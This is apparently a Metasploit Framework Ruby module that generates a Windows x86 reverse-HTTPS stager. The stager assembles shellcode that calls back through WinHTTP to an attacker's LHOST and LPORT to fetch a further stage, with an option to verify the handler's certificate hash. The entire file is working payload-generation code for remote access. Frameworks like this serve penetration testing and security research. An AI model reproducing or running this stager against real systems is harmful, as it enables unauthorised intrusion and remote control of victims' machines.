# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_winhttp'
require 'msf/core/payload/windows/verify_ssl'
require 'rex/payloads/meterpreter/uri_checksum'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS using WinHTTP
#
###


module Payload::Windows::ReverseWinHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseWinHttp
  include Msf::Payload::Windows::VerifySsl

  #
  # Register reverse_winhttps specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptBool.new('StagerVerifySSLCert', [false, 'Whether to verify the SSL certificate hash in the handler', false])
      ], self.class)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttps(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
  def generate

    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                         datastore['HandlerSSLCert'])

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space

      if verify_cert_hash
        raise ArgumentError, "StagerVerifySSLCert is enabled but not enough payload space is available"
      end

      return generate_reverse_winhttps(
        ssl:  true,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  generate_small_uri,
        verify_cert_hash: verify_cert_hash,
        retry_count: datastore['StagerRetryCount'])
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC'],
      verify_cert_hash: verify_cert_hash,
      retry_count: datastore['StagerRetryCount']
    }

    generate_reverse_winhttps(conf)
  end

  def transport_config(opts={})
    transport_config_reverse_https(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    space = super

    # SSL support adds 20 bytes
    space += 20

    # SSL verification adds 120 bytes
    if datastore['StagerVerifySSLCert']
      space += 120
    end

    space
  end

end

end

